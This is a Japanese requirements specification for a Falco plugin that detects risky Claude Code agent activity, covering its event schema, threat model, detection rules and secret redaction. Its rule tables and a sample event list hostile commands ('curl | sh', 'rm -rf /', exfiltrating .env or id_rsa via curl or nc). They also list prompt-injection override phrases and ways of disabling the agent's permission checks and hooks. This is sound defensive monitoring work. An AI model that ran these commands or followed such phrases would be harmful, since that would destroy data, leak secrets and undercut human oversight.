| Rotation | rename/truncate検出、inode変更、reopen。 |
| Backpressure | channel full 時は drop counter を増やす。ログに残すが無限ブロックしない。 |
| Test | synthetic append → alert timestamp を計測する。 |

---

## 9. OpenTelemetry 連携要件

### 9.1 位置付け

OpenTelemetry は重要だが、v0.1 では Falco plugin の primary detection path ではなく、parallel observability / correlation path とする。

```text
Primary security detection path:
Claude Code Hook
  → hook logger
  → ~/.claude/security/events.jsonl
  → Falco source plugin
  → Falco rules
  → alert

Observability / correlation path:
Claude Code native OpenTelemetry
  → OTel Collector
  → SIEM / Loki / ClickHouse / Datadog / Honeycomb / Elastic 等

Optional bridge:
~/.claude/security/events.jsonl
  → OTel Collector filelog receiver
  → central logs backend
```

### 9.2 なぜ OTel を主入力にしないか

| 理由 | 説明 |
|---|---|
| 遅延 | Claude Code OTel logs は既定で数秒単位の export interval を持つため、sub-second alert の主入力に不利。 |
| schema差分 | Hook stdin JSON と OTel event schema は同一ではない。 |
| redaction | prompt/tool内容は既定で redacted される場合がある。逆に raw body を有効化すると情報漏洩リスクが高い。 |
| Collector依存 | network、Collector、backendが停止すると検知が止まる。 |
| 攻撃面 | Falco plugin 内に OTLP receiver を実装するとネットワークサーバーを持つことになり、責務が広がる。 |
| Falcoらしさ | local event source + rules の方が初期リリースとして単純で堅牢。 |

### 9.3 OTel 相関要件

| ID | 要件 |
|---|---|
| OTEL-001 | hook logger event に `session_id` を保持する。 |
| OTEL-002 | tool event には `tool_use_id` を保持し、OTel `tool_result` / `tool_decision` と相関可能にする。 |
| OTEL-003 | 可能な場合は `prompt_id` または OTel prompt correlation attribute を外部相関で紐付ける。Hook input に無い場合は v0.1 で必須にしない。 |
| OTEL-004 | OTel native events は中央集約・利用状況・コスト・長期分析に利用する。 |
| OTEL-005 | `OTEL_LOG_RAW_API_BODIES` は原則禁止または managed policy で厳格管理する。 |
| OTEL-006 | `OTEL_LOG_USER_PROMPTS`, `OTEL_LOG_TOOL_DETAILS`, `OTEL_LOG_TOOL_CONTENT` はプライバシーリスク評価後に有効化する。 |
| OTEL-007 | events.jsonl を OTel Collector filelog receiver で送る場合は、redacted JSONL のみを対象にする。 |

### 9.4 OTel Collector filelog 例

```yaml
receivers:
  filelog/claude_code_security:
    include:
      - /Users/*/.claude/security/events.jsonl
    start_at: end
    operators:
      - type: json_parser

processors:
  attributes/claude_code:
    actions:
      - key: service.name
        value: claude-code-security
        action: upsert

exporters:
  otlp:
    endpoint: https://otel.example.com:4317
    headers:
      Authorization: Bearer ${OTEL_TOKEN}

service:
  pipelines:
    logs:
      receivers: [filelog/claude_code_security]
      processors: [attributes/claude_code]
      exporters: [otlp]
```

---

## 10. Event schema 要件

### 10.1 正規化イベント例

> **timezone ポリシー**: timestamp は RFC3339 形式（`2006-01-02T15:04:05.000Z07:00`）で local + offset を許容する。下記サンプルは `+09:00` だが、組織横断で集約する場合は logger 側で UTC (`Z`) に正規化することを推奨する。Falco rule 側で時刻比較を行う場合は `claude_code.received_at` を string で扱い、SIEM/OTel 側で時刻正規化を行う。

```json
{
  "schema_version": "claude_code_security_event/v1",
  "received_at": "2026-04-26T12:34:56.789+09:00",
  "logger_version": "0.1.0",
  "host": "dev-macbook.local",
  "user": "alice",
  "session_id": "abc123",
  "transcript_path": "/Users/alice/.claude/projects/.../transcript.jsonl",
  "cwd": "/Users/alice/project",
  "permission_mode": "default",
  "hook_event_name": "PreToolUse",
  "tool_name": "Bash",
  "tool_use_id": "toolu_01ABC123",
  "command": "curl https://example.com/install.sh | sh",
  "file_path": "",
  "url": "",
  "mcp_server_name": "",
  "mcp_tool_name": "",
  "risk_type": "dangerous_bash",
  "risk_score": 90,
  "severity": "critical",
  "evidence": "curl|sh pipeline",
  "redaction_status": "redacted",
  "raw_event_sha256": "...",
  "event_size_bytes": 1234,
  "latency_ms": 12,
  "dropped": false
}
```

### 10.2 Falco fields

Falco SDK の制約と実装容易性を考え、初期は `string` と `uint64` を中心にする。boolean は `string` (`"true"/"false"`) または `uint64` (`0/1`) で表現する。

> **schema event ↔ Falco field の型変換**: §10.1 の正規化イベントは JSON 表現であり boolean / number をそのまま含む。Falco field は SDK 制約により `string` または `uint64` に限定されるため、Extract() 内で変換する。たとえば schema 上の `dropped: false` は Falco field `claude_code.dropped` として `"false"` に、`risk_score: 90` は `claude_code.risk_score` として `90 (uint64)` に変換される。Falco rules では文字列比較（`claude_code.dropped = "true"`）または数値比較（`claude_code.risk_score >= 70`）で評価する。
>
> **Go 実装例**:
> ```go
> // boolean → string
> req.SetValue(strconv.FormatBool(event.Dropped))   // "true" / "false"
>
> // int / float → uint64
> req.SetValue(uint64(event.RiskScore))             // 0..255 の範囲を超えないこと
>
> // negative number は uint64 に直接入れない（unsigned overflow）。0 にクリップ or 別フィールドへ
> if event.LatencyMs < 0 { req.SetValue(uint64(0)) } else { req.SetValue(uint64(event.LatencyMs)) }
> ```

| Field | Type | 説明 |
|---|---|---|
| `claude_code.schema_version` | string | normalized event schema |
| `claude_code.received_at` | string | hook logger受信時刻 |
| `claude_code.logger_version` | string | hook logger version |
| `claude_code.host` | string | host名 |
| `claude_code.user` | string | OS user |
| `claude_code.session_id` | string | Claude Code session id |
| `claude_code.transcript_path` | string | transcript path。raw transcriptは読まない |
| `claude_code.cwd` | string | current working directory |
| `claude_code.permission_mode` | string | Claude Code が公式に提供する permission mode 値（v3 時点: `default`, `acceptEdits`, `plan`, `bypassPermissions`）。Claude Code 側の仕様変更で値が増減する可能性があるため、parser は unknown 値をそのまま保持し rule 側で扱う。`permissions.dontAsk` は permission_mode の値ではなく settings 配下の別フィールドであり、`claude_code.permission_destination` または専用 field で扱う |
| `claude_code.event_name` | string | Hook event name |
| `claude_code.source` | string | ConfigChange等の source |
| `claude_code.tool_name` | string | Bash/Read/Write/Edit/WebFetch/MCP tool等 |
| `claude_code.tool_use_id` | string | tool invocation id |
| `claude_code.command` | string | Bash command redacted/truncated |
| `claude_code.command_hash` | string | commandのhash |
| `claude_code.file_path` | string | 対象ファイルパス |
| `claude_code.file_event` | string | change/add/unlink等 |
| `claude_code.url` | string | WebFetch/HTTP/MCP等のURL |
| `claude_code.domain` | string | URL domain |
| `claude_code.mcp_server_name` | string | MCP server name |
| `claude_code.mcp_tool_name` | string | MCP tool name |
| `claude_code.mcp_scope` | string | user/project/local/plugin/managed |
| `claude_code.permission_destination` | string | session/localSettings/projectSettings/userSettings等 |
| `claude_code.permission_behavior` | string | allow/deny/ask等 |
| `claude_code.risk_type` | string | detector が付与するカテゴリ。命名規約: snake_case で T-* と 1:1 対応（`T-001` → `dangerous_bash`, `T-002` → `secret_exfiltration`, `T-003` → `permission_bypass`, `T-004` → `permission_update`, `T-005` → `settings_modified`, `T-006` → `hook_disabled`, `T-007` → `mcp_config_changed`, `T-008` → `mcp_tool_suspicious`, `T-009` → `sensitive_file_read`, `T-010` → `workspace_escape`, `T-011` → `git_destructive`, `T-012` → `prompt_injection`, `T-013` → `agent_risk`, `T-014` → `tool_storm`, `T-015` → `external_fetch_sensitive`, `T-016` → `policy_downgrade`, `T-017` → `skill_shell`, `T-018` → `channel_push`） |
| `claude_code.risk_score` | uint64 | 0-100 |
| `claude_code.severity` | string | critical/warning/notice/info |
| `claude_code.evidence` | string | redacted evidence |
| `claude_code.redaction_status` | string | none/redacted/truncated/error |
| `claude_code.raw_event_sha256` | string | raw input hash |
| `claude_code.event_size_bytes` | uint64 | event size |
| `claude_code.duration_ms` | uint64 | tool duration |
| `claude_code.latency_ms` | uint64 | logger/plugin latency |
| `claude_code.tool_count` | uint64 | batch内 tool数 |
| `claude_code.failure_count` | uint64 | batch/session aggregation用 |
| `claude_code.dropped` | string | true/false |
| `claude_code.raw_excerpt` | string | 既定では空。debug/replay時のみ redacted excerpt |

### 10.3 schema versioning

| 要件 | 内容 |
|---|---|
| Version field | `schema_version` を必須にする。 |
| Backward compatibility | minor 追加は許容、field削除/型変更は major 変更。 |
| Unknown fields | parserは無視する。 |
| Required fields | `schema_version`, `received_at`, `session_id`, `hook_event_name`, `risk_type`, `risk_score`。 |
| Optional fields | event type によって存在しない項目は空文字/0。 |

---

## 11. Threat model

### 11.1 保護対象

| Asset | 保護理由 |
|---|---|
| ソースコード | 知的財産、脆弱性情報、未公開機能を含む。 |
| secrets | `.env`, API keys, SSH keys, cloud credentials, kubeconfig 等。 |
| Claude Code settings | 権限、hooks、MCP、plugin、sandbox設定を制御する。 |
| MCP configurations | 外部サービス・DB・APIへの接続経路になる。 |
| 開発端末 | Claude Code が Bash / file edit を実行する主体。 |
| Falco plugin / hook logger | 監視基盤自体。改ざんされると検知が無効化される。 |
| telemetry backend | alertや監査ログを保持する。 |

### 11.2 攻撃者モデル

| 攻撃者 | 例 | 想定する攻撃 |
|---|---|---|
| 悪意ある外部コンテンツ | WebFetch先、issue、PR、README、MCP resource | prompt injection、秘密情報送信指示、tool misuse |
| 悪意あるリポジトリ | `.claude/settings.json`, `.mcp.json`, skills/agents | hooks無効化、MCP追加、権限緩和、prompt injection |
| 誤操作ユーザー | `--dangerously-skip-permissions`, `bypassPermissions` | 権限確認なしの危険実行 |
| 悪意あるMCP server | stdio/http/sse server | credential exfiltration、tool response injection |
| supply-chain攻撃 | plugin marketplace、npm/npx command | 不正MCP/plugin/skill導入 |
| compromised hook logger | logger binary改ざん | ログ抑止、redaction解除、偽イベント生成 |

### 11.3 Trust boundaries

```text
[Untrusted repo / external content / MCP resource]
        ↓
[Claude Code prompt + tool planning]
        ↓ Hook JSON boundary
[hook logger: trusted if installed securely]
        ↓ local file boundary
[events.jsonl: sensitive, redacted, protected]
        ↓ plugin boundary
[Falco process + rules]
        ↓ alert boundary
[SIEM / OTel / incident response]
```

### 11.4 主要リスクと対策

> 本表は §11 Threat model の文脈で導出されるリスク（`TR-*` = Threat-Risk）。実装・運用全般のリスクは §23.1 `RK-*` で別管理する。一部は概念的に重なるため右端列に対応する `RK-*` を併記し、相互参照を明示する。

| ID | リスク | 影響 | 対策 | 関連 RK-* |
|---|---|---|---|---|
| TR-001 | Hook logger 自体のコマンド注入 | 高 | shell scriptではなく Go binary、絶対パス、stdin JSON parse、stdout quiet | RK-003 |
| TR-002 | secrets のログ保存 | 高 | redaction、field length limit、raw payload 無効、0600 | RK-004 |
| TR-003 | Hook 無効化 | 高 | `ConfigChange` 監査、managed settings、hook presence check | RK-011 |
| TR-004 | `.claude/settings.json` による権限緩和 | 高 | ConfigChange + FileChanged + rules で検知 | （該当 RK 無し: 個別 rule で吸収） |
| TR-005 | MCP server 追加 | 高 | `.mcp.json` / `~/.claude.json` / plugin MCP 監査 | RK-010 |
| TR-006 | alert latency 過大 | 中 | fsnotify + polling, SLO test, NextBatch tuning | RK-008 |
| TR-007 | False positive 過多 | 中 | category 別 severity、benign test、allowlist | RK-009 |
| TR-008 | Falco rule 不発火 | 高 | `source: claude_code`, `evt.type` 不使用、Field/Extract 一致チェック | RK-006 |
| TR-009 | macOS/Linux artifact 混同 | 高 | `.dylib`/`.so` 分離、`file` 検証、release naming | RK-005 |
| TR-010 | cross-source 相関誤解 | 中 | Falco 内相関しない。OTel/SIEM で相関 | RK-012 |

---

## 12. 脅威カテゴリと検知要件

### 12.1 v0.1 必須カテゴリ

> **Priority 凡例**:
> - `CRITICAL`: 即時対応すべき高リスク。on-call エスカレーション対象。
> - `WARNING`: 高頻度の偽陽性が許容範囲なら通知、要レビュー。
> - `NOTICE`: 統計・後追い分析向け。単発でアラートにせず集計対象とする。
> - `NOTICE/WARNING`: ベース priority は `NOTICE` だが、`claude_code.risk_score >= 70` または特定の context（permission_mode が `bypassPermissions` 等）で `WARNING` に昇格する条件付き。詳細は §14.2 D-001 detector が付与する `severity` に従う。
>
> **Falco rule での書き分け方（v0.1 採用方針）**: Falco の仕様上、1 ルールに priority は 1 つしか書けない。条件付き昇格を実装する場合は、**カテゴリごとに 2 ルールに分割**する：
> - 例: T-013 Agent Subagent Risk
>   - `[CLAUDE_CODE NOTICE] Agent Subagent Risk (low)` … `condition: ... and claude_code.risk_score < 70`
>   - `[CLAUDE_CODE WARNING] Agent Subagent Risk (high)` … `condition: ... and claude_code.risk_score >= 70`
> - 共通 condition は **macro** に切り出して両ルールから参照する（DRY 原則）。
> - 代替案として detector 側で `claude_code.severity` field を出し、ルールは `claude_code.severity = "warning"` で評価する方式もあるが、v0.1 では risk_score ベースの 2 ルール方式を主とする。

| ID | カテゴリ | Priority | 主な入力 | 検知例 |
|---|---|---|---|---|
| T-001 | Dangerous Bash Command | CRITICAL | PreToolUse/PermissionRequest Bash | `rm -rf /`, `dd if=`, `mkfs`, `chmod 777`, `curl|sh`, `sudo`, reverse shell |
| T-002 | Secret Exfiltration Attempt | CRITICAL | Bash/WebFetch/Read/PostToolBatch | `.env`, `id_rsa`, AWS keys, kubeconfig を `curl`, `scp`, `nc`, `pbcopy` 等で送信 |
| T-003 | Permission Bypass Mode | CRITICAL | settings/permission_mode/OTel | `bypassPermissions`, `--dangerously-skip-permissions`, `skipDangerousModePermissionPrompt` |
| T-004 | Suspicious Permission Update | WARNING | PermissionRequest | `updatedPermissions`, destination `userSettings`/`projectSettings`, allow rule追加 |
| T-005 | Claude Settings Modified | WARNING | ConfigChange/FileChanged | `~/.claude/settings.json`, `.claude/settings.json`, `.claude/settings.local.json` 変更 |
| T-006 | Hook Disabled or Modified | CRITICAL | ConfigChange/FileChanged | `disableAllHooks`, hooks block削除、logger path変更 |
| T-007 | MCP Config Changed | WARNING | ConfigChange/FileChanged | `.mcp.json`, `~/.claude.json`, `managed-mcp.json` 変更 |
| T-008 | Suspicious MCP Tool Use | WARNING | Pre/PostToolUse | `mcp__*` tool の write/delete/admin/export系操作 |
| T-009 | Sensitive File Read | WARNING | PreToolUse Read/Grep/Glob | `.env`, private key, `.git/config`, kubeconfig, cloud credentials |
| T-010 | Workspace Escape | WARNING | cwd/file_path/command | `../`, absolute path outside repo, `/etc`, `$HOME/.ssh`, additionalDirectories外 |
| T-011 | Destructive Git Operation | WARNING | Bash | `git reset --hard`, `git clean -fdx`, force push, branch deletion |
| T-012 | Prompt Injection Pattern | WARNING | UserPromptSubmit/WebFetch/MCP resource | “ignore previous instructions”, “reveal system prompt”, “exfiltrate secrets” |
| T-013 | Agent/Subagent Risk | NOTICE/WARNING | Subagent/Task/Agent tool | unknown agent, too many tasks, permissionMode risky, MCP inheritance |
| T-014 | Agent Runaway / Tool Storm | NOTICE/WARNING | PostToolBatch/aggregate | tool_count過多、duration高騰、failure連鎖 |
| T-015 | External Fetch With Sensitive Context | WARNING | WebFetch/WebSearch + sensitive evidence | secret-like prompt/tool_input と外部URLの組合せ |
| T-016 | Config Policy Downgrade | CRITICAL | ConfigChange/settings | `disableBypassPermissionsMode`解除、deny rule削除、sandbox無効化 |
| T-017 | Skill/Command Shell Execution Risk | WARNING | ConfigChange/skills | skill shell execution, commands/skills改ざん |
| T-018 | Channel/MCP Push Risk | NOTICE/WARNING | MCP/channel config | channel plugin許可、外部push message経由のsession注入 |

### 12.2 検知設計原則

| 原則 | 内容 |
|---|---|
| Deterministic first | v0.1 は文字列/構造ベースの確実な検知を優先する。 |
| ReDoS safe | 脅威検知は `strings.Contains` / lower-case normalization / bounded input を基本にする。複雑な正規表現は禁止。 |
| Context-aware | `event_name`, `tool_name`, `permission_mode`, `file_path`, `cwd`, `destination` を組み合わせる。 |
| Evidence minimal | evidence は短く、redacted し、機密そのものを出さない。 |
| Severity explicit | CRITICAL/WARNING/NOTICE を明確に分ける。 |
| Benign tests | すべてのカテゴリに true negative を用意する。 |

### 12.3 初期ルール例

```yaml
- required_plugin_versions:
  - name: claude-code
    version: 0.1.0

- rule: "[CLAUDE_CODE CRITICAL] Dangerous Bash Command"
  desc: "Detect dangerous Bash commands attempted by Claude Code"
  condition: >
    claude_code.event_name in ("PreToolUse", "PermissionRequest") and
    claude_code.tool_name = "Bash" and
    (
      claude_code.command icontains "rm -rf /" or
      (claude_code.command icontains "curl" and claude_code.command icontains "| sh") or
      claude_code.command icontains "chmod 777" or
      claude_code.command icontains "mkfs" or
      claude_code.command icontains "dd if="
    )
  output: >
    [CLAUDE_CODE] dangerous bash command
    (session=%claude_code.session_id user=%claude_code.user cwd=%claude_code.cwd
    command=%claude_code.command evidence=%claude_code.evidence risk=%claude_code.risk_score)
  priority: CRITICAL
  source: claude_code
  tags: [claude_code, ai_agent, bash, critical]
```

注意: 実際の Falco condition で `and` / `or` の優先順位と括弧を必ず検証する。`evt.type` は使わない。全ルールに `source: claude_code` を付ける。

> **本例は代表パターンのみ**。`rm -rf .`, `rm -rf *`, `rm -fr /` のような variant 等の網羅性は Phase 4 のテスト（benign / edge_cases 含む E2E パターン JSON）で検証し、必要なら detector 側の `risk_type` / `risk_score` を組み合わせる。

### 12.4 T-002〜T-018 の condition 雛形（実装ガイド）

T-001 以外の 17 カテゴリは、実装時に次の condition 雛形を起点として詳細化する。各雛形は dev-kit 側 `plugin-rules` スキル（T5-9）と Phase 4 の Level 1 パターンテストで検証する。

| ID | condition 雛形（イメージ） |
|---|---|
| T-002 Secret Exfiltration | `tool_name in ("Bash","WebFetch") and (command icontains ".env" or command icontains "id_rsa" or command icontains "AKIA") and (command icontains "curl" or command icontains "scp" or command icontains "nc " or command icontains "pbcopy")` |
| T-003 Permission Bypass Mode | `permission_mode = "bypassPermissions" or command icontains "--dangerously-skip-permissions" or evidence icontains "skipDangerousModePermissionPrompt"` |
| T-004 Suspicious Permission Update | `event_name = "PermissionRequest" and permission_destination in ("userSettings","projectSettings") and permission_behavior = "allow"` |
| T-005 Claude Settings Modified | `event_name in ("ConfigChange","FileChanged") and (file_path icontains "/.claude/settings.json" or file_path icontains "/.claude/settings.local.json")` |
| T-006 Hook Disabled | `event_name = "ConfigChange" and (evidence icontains "disableAllHooks" or evidence icontains "hooks: null" or risk_score >= 90)` |
| T-007 MCP Config Changed | `event_name in ("ConfigChange","FileChanged") and (file_path icontains ".mcp.json" or file_path icontains "/.claude.json" or file_path icontains "managed-mcp.json")` |
| T-008 Suspicious MCP Tool Use | `tool_name startswith "mcp__" and (tool_name icontains "write" or tool_name icontains "delete" or tool_name icontains "admin" or tool_name icontains "export")` |
| T-009 Sensitive File Read | `tool_name in ("Read","Grep","Glob") and (file_path icontains "/.env" or file_path icontains "id_rsa" or file_path icontains "/.git/config" or file_path icontains "/.kube/config")` |
| T-010 Workspace Escape | `command icontains ".." or file_path startswith "/etc" or file_path icontains "/.ssh/"` |
| T-011 Destructive Git | `tool_name = "Bash" and (command icontains "git reset --hard" or command icontains "git clean -fdx" or command icontains "git push --force" or command icontains "git branch -D")` |
| T-012 Prompt Injection | `event_name in ("UserPromptSubmit","WebFetch") and (evidence icontains "ignore previous instructions" or evidence icontains "reveal system prompt" or evidence icontains "exfiltrate")` |
| T-013 Agent/Subagent Risk | `event_name in ("SubagentStart","TaskCreated") and (risk_score >= 50 or permission_mode = "bypassPermissions")` |
| T-014 Tool Storm | `event_name = "PostToolBatch" and tool_count >= 50` |
| T-015 External Fetch + Sensitive | `tool_name in ("WebFetch","WebSearch") and risk_score >= 60` |
| T-016 Config Policy Downgrade | `event_name = "ConfigChange" and (evidence icontains "disableBypassPermissionsMode: false" or evidence icontains "deny: []")` |
| T-017 Skill Shell Execution | `event_name = "ConfigChange" and (file_path icontains "/.claude/skills/" or evidence icontains "shellExecution: true")` |
| T-018 Channel/MCP Push | `event_name in ("ConfigChange","FileChanged") and evidence icontains "channel" and risk_score >= 50` |

実装時の注意:
- `*` で省略している部分は `claude_code.` プレフィックスを補う
- `risk_score` は detector が付与（§14.2 D-001）。閾値は v0.1 既定（50/60/70/90）を使い、benign テストで調整する
- 上記雛形は **概念モデル**であり、benign パターンとの競合がないか §29 付録 B の rule pack 実装時に必ず検証する

---

## 13. Rules 要件

| ID | 要件 |
|---|---|
| R-001 | 全ルールに `source: claude_code` を設定する。 |
| R-002 | `evt.type` を使わない。plugin eventでは基本的に無効。 |
| R-003 | `required_plugin_versions` を rules file 先頭に置く。 |
| R-004 | `claude_code.*` fields だけを参照する。 |
| R-005 | list/macro/rule を整理し、重複条件を避ける。 |
| R-006 | 具体的・高severityルールを上位に置く。広いNOTICEルールは下位に置く。 |
| R-007 | output に必要十分な context を含めるが、secret値は出さない。 |
| R-008 | `icontains` を中心にしつつ、複雑な条件は detector 側の `risk_type` / `risk_score` に寄せる。 |
| R-009 | CRITICAL/WARNING/NOTICE の基準を文書化する。 |
| R-010 | `falco -V` または YAML lint を CI で実行する。 |
| R-011 | boolean 由来の string field（`claude_code.dropped` など、§10.2 で `string` 型化されている項目）は Falco rule 内で文字列リテラル `"true"` / `"false"` を用いて比較する。`= true` と書いてはならない（YAML / Falco rule engine では undefined 動作）。 |

---

## 14. Parser / Detector 要件

### 14.1 Parser

| ID | 要件 |
|---|---|
| P-001 | JSONL の1行を `ClaudeCodeSecurityEvent` として parse する。 |
| P-002 | unknown fields は無視する。 |
| P-003 | required fields が欠落した場合は malformed として扱う。 |
| P-004 | timestamp parse に失敗してもイベントを破棄せず、received_at を fallback にする。 |
| P-005 | map fields は必ず初期化し、GOB nil map panic を防ぐ。 |
| P-006 | file tail の既存ログ再処理を避けるため default `SeekEnd`。 |
| P-007 | test/replay mode では beginning から読む設定を可能にする。 |

### 14.2 Detector

| ID | 要件 |
|---|---|
| D-001 | `risk_type`, `risk_score`, `severity`, `evidence` を付与する。 |
| D-002 | detector は ReDoS safe な文字列処理を基本にする。 |
| D-003 | URL decode は最大3段階まで。 |
| D-004 | 入力検査は最大10KB〜64KBの bounded input で行う。 |
| D-005 | evidence は最大2KBで redacted/truncated。 |
| D-006 | rule と detector の重複を許容するが、複雑な判定は detector 側に寄せる。 |
| D-007 | category別 pattern fixtures を持つ。 |
| D-008 | allowlist/safelist を設定可能にする。例: trusted domains, safe commands, project paths。 |

---

## 15. Detection と Prevention の分担

### 15.1 基本方針

Falco plugin は **detect-first** とする。Claude Code の tool execution を止める場合は、Falco plugin ではなく Claude Code Hook policy で実装する。

```text
Detection path:
Hook event → hook logger → JSONL → Falco plugin → Falco alert

Prevention path:
PreToolUse / PermissionRequest / ConfigChange → policy hook → allow / deny / ask / defer / block
```

### 15.2 optional prevention layer

| ID | 要件 | v0.1での扱い |
|---|---|---|
| PRV-001 | Dangerous Bash を `PreToolUse` で deny | optional PoC |
| PRV-002 | Secret exfiltration を `PreToolUse` で deny | optional PoC |
| PRV-003 | ConfigChange で hooks無効化を block | optional PoC |
| PRV-004 | PermissionRequest で永続 allow を deny | optional PoC |
| PRV-005 | Falco alert から hook policyへフィードバック | v0.2以降 |

### 15.3 Prevention を分離する理由

| 理由 | 説明 |
|---|---|
| 同期制御の場所 | Claude Code の実行前制御は Hook が持つ。 |
| Falcoの責務 | Falcoはイベント評価とalertに強い。 |
| 安全性 | plugin内で外部制御まで持つと責務が肥大化する。 |
| テスト容易性 | detectionとpreventionを分けることで誤検知時の影響を抑えられる。 |

---

## 16. Claude Code 設定・権限・MCP 監査要件

### 16.1 監査対象ファイル

| Path | 種別 | リスク |
|---|---|---|
| `~/.claude/settings.json` | user settings | 全プロジェクトに影響する hooks/permissions/plugins/env。 |
| `.claude/settings.json` | project settings | repo共有されるため、悪意あるrepoリスク。 |
| `.claude/settings.local.json` | local project settings | 個人の許可・実験設定。 |
| managed settings | enterprise policy | 高優先度。変更監査は必要だが、policy settingsのblockは無視される場合がある。 |
| `~/.claude.json` | global/local MCP・OAuth・state | MCP user/local scope、OAuth session、allowed tools等。 |
| `.mcp.json` | project MCP | team共有MCP。supply-chainリスク。 |
| `.claude/skills/` | skills | promptやshell execution経由のリスク。 |
| `.claude/agents/` | agents/subagents | tool/permission/MCP設定のリスク。 |
| plugin root `.mcp.json` / `plugin.json` | plugin-provided MCP | plugin有効化で自動MCP接続。 |

### 16.2 設定変更で検知すべき項目

| 項目 | Severity | 理由 |
|---|---|---|
| `disableAllHooks: true` | CRITICAL | 監視無効化。 |
| hook logger command削除/変更 | CRITICAL | イベント出力停止。 |
| `permissions.defaultMode: bypassPermissions` | CRITICAL | 権限確認回避。 |
| `skipDangerousModePermissionPrompt: true` | CRITICAL | 危険モード確認をスキップ。 |
| `disableBypassPermissionsMode` の解除 | CRITICAL | bypass許可。 |
| deny rulesから secrets除外が消える | WARNING/CRITICAL | 秘密情報アクセス可能化。 |
| `allow` に `Bash(*)`, `Read(./.env)` 等 | WARNING/CRITICAL | 過剰許可。 |
| MCP server追加 | WARNING | 外部接続・tool追加。 |
| plugin marketplace追加 | WARNING | supply-chain拡大。 |
| skill shell execution有効化/追加 | WARNING | prompt経由のshell実行。 |

---

## 17. Security / Privacy 要件

| ID | 要件 |
|---|---|
| SEC-001 | Hook logger binary は絶対パスで指定する。 |
| SEC-002 | Hook command は shell expansion に依存しない。必要な場合も quote を厳格化する。 |
| SEC-003 | Hook input は信頼しない。JSON parse、型チェック、サイズ制限を行う。 |
| SEC-004 | `events.jsonl` は `0600`、directory は `0700`。 |
| SEC-005 | Secret redaction は logger 側で行い、pluginに入る前に秘匿する。 |
| SEC-006 | Authorization, Bearer, API key, SSH key, private key, cookie, token, password を検出・redactする。最小ターゲットは下表の §17.1 を満たすこと。 |
| SEC-007 | raw prompt/tool_response は保存しない。debug時も redacted excerpt のみ。 |
| SEC-008 | OTel raw API bodies は原則禁止。使用時は明示 consent、保存先、retention、権限を定義する。 |
| SEC-009 | plugin/rules/logger の checksum を release asset に含める。 |
| SEC-010 | hook logger の改ざん検知を future work として検討する。 |
| SEC-011 | managed settings で hook/OTel/security policy を配布する企業利用パターンをサポートする。 |
| SEC-012 | ログ保持期間を定義する。既定: local 7〜30日、centralは組織ポリシーに従う。 |

### 17.1 Redaction 最小パターン

実装で最低限カバーすべき redaction ターゲット。検出した値はマスク文字（例: `***REDACTED:<kind>***`）に置換する。pattern は ReDoS safe な anchored / bounded 正規表現とし、入力長は §14.2 D-004 のサイズ上限を超えない。

| 種別 | 例 / 想定 pattern |
|---|---|
| AWS Access Key ID | `AKIA[0-9A-Z]{16}` |
| AWS Secret Access Key | 40 文字 base64 風 + Authorization/`Secret` 系コンテキスト一致 |
| GCP Service Account JSON | `"private_key":` を含む JSON サブツリー全体を redact |
| Slack Bot/User Token | `xox[abprs]-[A-Za-z0-9-]{10,}` |
| GitHub PAT | `ghp_[A-Za-z0-9]{36}`, `github_pat_[A-Za-z0-9_]{60,}` |
| OpenAI / Anthropic API Key | `sk-[A-Za-z0-9_-]{20,}`, `sk-ant-[A-Za-z0-9_-]{20,}` |
| OAuth Bearer | HTTP `Authorization: Bearer <token>`、`Authorization=` などの key/value |
| Generic JWT | `eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}` |
| RSA / SSH Private Key | `-----BEGIN [A-Z ]+PRIVATE KEY-----` から `-----END ` までのブロック全体 |
| `.env` 形式 | `^[A-Z0-9_]+=` 行で値の右辺を redact |
| Cookie header | `Cookie:` ヘッダ、`Set-Cookie:` の `name=value` の value 側 |
| Cloud credentials path | `~/.aws/credentials`, `~/.kube/config`, `~/.gcp/...` への参照は path だけ残し、内容は読み込まない |

実装時の注意:
- すべて `(?i)` フラグ等の case-insensitive を許容するが、性能と ReDoS 安全性のため anchored / bounded を厳守する。
- 検出件数は redaction counter（§6.3 FP-011）で観測可能にする。
- 既存 OSS（`detect-secrets`, `gitleaks`）の pattern セットを参照しつつ、ライセンス互換性を確認して同梱または再実装する。

---

## 18. Falco 設定要件

### 18.1 `falco-local.yaml` 例

```yaml
plugins:
  - name: claude-code
    library_path: ./libclaude-code-plugin-darwin-arm64.dylib
    init_config:
      log_paths:
        - ~/.claude/security/events.jsonl
      start_at: end
      buffer_size: 1024
      poll_interval_ms: 250
      debug: false

load_plugins: [claude-code]

rules_files:
  - ./rules/claude_code_rules.yaml

json_output: true
stdout_output:
  enabled: true
  rate: 0
  max_burst: 0
```

### 18.2 Linux `falco.yaml` 例

```yaml
plugins:
  - name: claude-code
    library_path: /usr/share/falco/plugins/libclaude-code-plugin-linux-amd64.so
    init_config:
      log_paths:
        - /home/*/.claude/security/events.jsonl
      start_at: end
      buffer_size: 4096
      poll_interval_ms: 250
      debug: false

load_plugins: [claude-code]

rules_files:
  - /etc/falco/claude_code_rules.yaml

json_output: true
stdout_output:
  enabled: true
  rate: 0
  max_burst: 0
```

### 18.3 必須チェック

| チェック | 失敗時の影響 |
|---|---|
| `load_plugins: [claude-code]` がある | pluginがロードされない。 |
| `rules_files` が個別ファイルを指す | rulesが読まれない。 |
| rules に `source: claude_code` がある | ruleが発火しない。 |
| rulesに `evt.type` がない | plugin eventで不発火。 |
| rate/max_burst がテスト時に無効化されている | alertが抑制される。 |
| macOSで `-U` を使う | stdout alertが出ない場合がある。 |

---

### 18.4 PROBLEM_PATTERNS との対応マッピング

`PROBLEM_PATTERNS.md`（dev-kit が蓄積した P001〜P021 + A コード）に整理された失敗パターンを、本要件のどこで吸収するかを明示する。実装・レビュー時はこの表を逆引きする。

| Pコード | 失敗内容 | 対応する要件 |
|---|---|---|
| P001 | macOS バイナリを Linux 用に配布 | §7.4, §21.1, §21.2 B-003/B-004, AC-013 |
| P002 | `-buildmode=c-shared` 不指定でロード不可 | §21.2 B-001, §27.2 ビルドフラグ |
| P003 | rule に `source` 不指定 | §13 R-001, §18.3, §29 |
| P004 | GOB nil map panic | §14.1 P-005 |
| P005 | rule で `evt.type` を使用 | §13 R-002, §18.3, §29 |
| P006 | counters / observability 不足 | §6.3 FP-011, §8.2 drop counter |
| P007 | NextBatch busy loop | §6.3 FP-007, §8.3 |
| P008 | `load_plugins` 不指定 | §18.3 |
| P009 | rules_files 個別指定不足 | §18.3 |
